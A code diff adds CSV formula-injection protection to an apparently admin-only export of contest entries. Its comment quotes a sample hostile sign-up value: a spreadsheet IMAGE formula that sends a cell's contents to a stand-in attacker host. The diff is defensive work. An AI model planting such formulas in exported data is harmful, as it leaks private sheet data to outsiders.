@@ -13,8 +13,19 @@ export const dynamic = 'force-dynamic';
  * Mail-in rows carry a name and address, so this is personal data: admin check
  * only, Cache-Control: no-store, and nothing is written to the logs.
  */
+/**
+ * One CSV cell, safe to open in a spreadsheet.
+ *
+ * Quoting alone does NOT stop Excel / Sheets treating a leading =, +, -, @ or
+ * tab as a formula, and these values come from a public form — an entrant
+ * could sign up as `=IMAGE("https://evil.tld/?x="&A2)@evil.tld` and exfiltrate
+ * the admin's own sheet on open. Prefix those with a single quote so they are
+ * read as text.
+ */
 function csvCell(v: unknown): string {
-  return `"${String(v ?? '').replace(/"/g, '""')}"`;
+  const s = String(v ?? '');
+  const neutralized = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s;
+  return `"${neutralized.replace(/"/g, '""')}"`;
 }
 
 export async function GET() {
